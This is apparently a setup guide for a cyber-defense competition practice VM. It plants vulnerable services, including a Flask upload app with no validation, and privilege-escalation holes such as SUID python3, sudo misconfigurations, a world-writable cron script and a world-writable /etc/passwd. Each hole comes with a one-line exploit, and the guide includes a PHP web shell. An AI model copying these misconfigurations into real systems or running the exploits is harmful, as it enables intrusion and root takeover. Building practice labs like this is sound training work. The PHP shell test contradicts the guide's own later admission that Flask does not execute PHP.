# CCDC Practice VM Setup Guide
# Run every command as root on a fresh Ubuntu 22.04 VM.
# This guide sets up 6 scorable services with intentional vulnerabilities.
# Follow each section in order. Do not skip steps.

===============================================================
SYSTEM OVERVIEW
===============================================================

Services to install:
  1. Apache + PHP       (port 80)   - SQLi login page + file leak
  2. Apache vhost       (port 8080) - Command injection tool
  3. Flask app          (port 8888) - File upload RCE
  4. OpenSSH            (port 22)   - Weak credentials
  5. vsftpd             (port 21)   - Anonymous FTP with credential leak
  6. Samba              (port 445)  - Null session share with credential leak

Privilege escalation vulnerabilities to plant:
  1. SUID bit on python3
  2. Sudo misconfiguration (deploy user can sudo vim with no password)
  3. World-writable cron script executed by root every minute
  4. World-writable /etc/passwd
  5. (bonus if docker is installed) devops user in docker group

Create the app directory:

--- File: /opt/uploadapp/app.py ---
Create this file with the following content exactly.
This is the VULNERABLE file upload app with no extension validation.

from flask import Flask, request, redirect, send_from_directory
import os

app = Flask(__name__)
UPLOAD_FOLDER = '/opt/uploadapp/uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/')
def index():
    files = os.listdir(UPLOAD_FOLDER)
    file_list = ''.join(f'<li><a href="/uploads/{f}">{f}</a></li>' for f in files)
    return f'''<!DOCTYPE html>
<html><head><title>CorpNet Image Gallery</title>
<style>
  body{{font-family:sans-serif;background:#0d1117;color:#c8f0ff;padding:40px}}
  h1{{color:#00d4ff}}
  input,button{{margin:4px;padding:8px}}
  button{{background:#00d4ff;border:none;border-radius:4px;cursor:pointer;font-weight:bold}}
</style></head>
<body>
<h1>Upload Profile Image</h1>
<form method="POST" action="/upload" enctype="multipart/form-data">
  <input type="file" name="file">
  <button type="submit">Upload</button>
</form>
<h2>Uploaded Files</h2>
<ul>{file_list}</ul>
</body></html>'''

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files.get('file')
    if f:
        f.save(os.path.join(app.config['UPLOAD_FOLDER'], f.filename))
    return redirect('/')

@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888, debug=False)

--- End of /opt/uploadapp/app.py ---

Create a systemd service so it starts automatically.
Create /etc/systemd/system/uploadapp.service with this content:

  [Unit]
  Description=CorpNet Upload App
  After=network.target

  [Service]
  User=www-data
  WorkingDirectory=/opt/uploadapp
  ExecStart=/usr/bin/python3 /opt/uploadapp/app.py
  Restart=always

  [Install]
  WantedBy=multi-user.target

Enable and start it:
  systemctl daemon-reload
  systemctl enable uploadapp
  systemctl start uploadapp

Test: browse to http://TARGET:8888/
Upload a file named shell.php with content: <?php system($_GET['cmd']); ?>
Then browse to http://TARGET:8888/uploads/shell.php?cmd=whoami
You should see "www-data".

NOTE: The Flask app does NOT execute PHP files itself. For PHP execution via Flask
you would need to proxy through Apache. If you want this to work out of the box,
run the upload app on Apache instead — create /opt/uploadapp as a PHP app with
move_uploaded_file() and no extension checks, served on port 8888 via Apache vhost.
The simpler approach: make the app a PHP app, not Flask.

SECTION 8 — PRIVILEGE ESCALATION VULNERABILITIES
===============================================================

--- PrivEsc 1: SUID python3 ---
  chmod u+s /usr/bin/python3

Exploit: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

--- PrivEsc 2: Sudo misconfiguration ---
Add these lines to /etc/sudoers (use visudo or append carefully):
  deploy ALL=(ALL) NOPASSWD: /usr/bin/vim
  www-data ALL=(ALL) NOPASSWD: /usr/bin/python3

Exploit for deploy: sudo vim -c ':!/bin/bash'
Exploit for www-data: sudo python3 -c 'import os; os.system("/bin/bash")'

--- PrivEsc 3: World-writable cron script ---
  mkdir -p /opt/scripts

Create /opt/scripts/cleanup.sh:
  #!/bin/bash
  find /tmp -type f -mtime +1 -delete

Make it writable by everyone and run it as root every minute:
  chmod 777 /opt/scripts/cleanup.sh

Create /etc/cron.d/cleanup with:
  * * * * * root /opt/scripts/cleanup.sh

Exploit: echo 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' >> /opt/scripts/cleanup.sh
Wait 1 minute, then: /tmp/bash -p

--- PrivEsc 4: World-writable /etc/passwd ---
  chmod 666 /etc/passwd

Exploit: echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
Then: su pwned (no password needed, gets root shell)

--- PrivEsc 5 (bonus): Docker socket ---
If docker is installed:
  usermod -aG docker deploy
  usermod -aG docker devops

Exploit: docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
